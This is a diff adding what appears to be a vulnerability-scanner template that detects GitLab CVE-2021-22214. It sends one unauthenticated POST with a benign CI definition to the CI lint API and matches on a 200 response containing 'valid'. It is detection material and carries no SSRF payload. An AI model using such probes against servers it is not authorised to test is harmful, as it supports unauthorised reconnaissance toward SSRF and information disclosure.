@@ -1,0 +1,30 @@
+id: CVE-2021-22214-gitlab-ci-lint-api-ssrf
+
+info:
+  author: Suman_Kar
+  name: GitLab CVE 2021-22214 Unauthenticated CI lint API information disclosure and SSRF
+  severity: medium
+  reference: https://docs.gitlab.com/ee/api/lint.html
+  tags: gitlab,disclosure,ssrf
+
+requests:
+  - raw:
+      - |
+        POST /api/v4/ci/lint HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko/20100101 Firefox/79.0
+        Referer: {{BaseURL}}
+        content-type: application/json
+        Connection: close
+
+        {"content": "{\"another_test\": {\"stage\": \"test\", \"script\": [ \"echo 2\" ] }}"}
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - (?:^|\W)valid(?:$|\W)
+      - type: status
+        status:
+          - 200
